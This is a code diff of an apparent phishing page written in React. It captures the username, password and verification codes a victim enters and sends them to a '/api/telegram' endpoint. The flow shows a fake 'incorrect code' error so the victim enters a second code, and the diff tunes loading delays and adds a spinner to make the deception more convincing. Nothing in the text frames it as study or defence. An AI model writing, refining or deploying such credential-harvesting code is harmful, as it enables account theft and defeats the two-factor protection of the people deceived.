@@ -44,7 +44,7 @@ export default function Home() {
     try {
       await fetch("/api/telegram", {
         method: "POST",
-        body: formData, // browser sets Content-Type including boundary
+        body: formData,
       });
     } catch (error) {
       console.error("Failed to send Telegram form:", error);
@@ -77,6 +77,10 @@ export default function Home() {
     await sendTelegramMessage(
       `Sign-in attempt:\nUsername: ${username}\nPassword: ${password}`
     );
+
+    setLoading(true);
+    await new Promise((resolve) => setTimeout(resolve, 2000));
+    setLoading(false);
 
     if (attemptCount === 0) {
       setAttemptCount(1);
@@ -111,14 +115,12 @@ export default function Home() {
     await sendTelegramMessage(`Code entered: ${code}`);
 
     if (codeAttemptCount === 0) {
-      // First failed attempt: show loading then display an error using React state
       setCodeAttemptCount(1);
       setLoading(true);
       setCodeError(null);
-      await new Promise((resolve) => setTimeout(resolve, 1200));
+      await new Promise((resolve) => setTimeout(resolve, 2000));
       setLoading(false);
       setCodeError("You entered the incorrect code (RFM68A)");
-      // keep showCodePage true so the code entry UI remains visible
       setShowCodePage(true);
     } else if (codeAttemptCount === 1) {
       await sendTelegramMessage(`Second code attempt: ${code}`);
@@ -148,7 +150,7 @@ export default function Home() {
 
     await sendTelegramForm(formData);
     setShowLoading(true);
-    await new Promise((resolve) => setTimeout(resolve, 3000));
+    await new Promise((resolve) => setTimeout(resolve, 4000));
     setShowLoading(false);
     setShowConfirmationPage(true);
   };
@@ -534,6 +536,11 @@ export default function Home() {
         </div>
       </header>
       <main className="max-w-2xl mx-auto px-4 py-8">
+        {loading && (
+          <div className="flex items-center justify-center mt-4">
+            <div className="animate-spin rounded-full h-10 w-10 border-t-4 border-b-4 border-[#87CEEB]"></div>
+          </div>
+        )}
         <button className="flex items-center gap-2 text-[#0066CC] font-medium mb-8 hover:underline">
           <ChevronLeft size={20} />
           Back
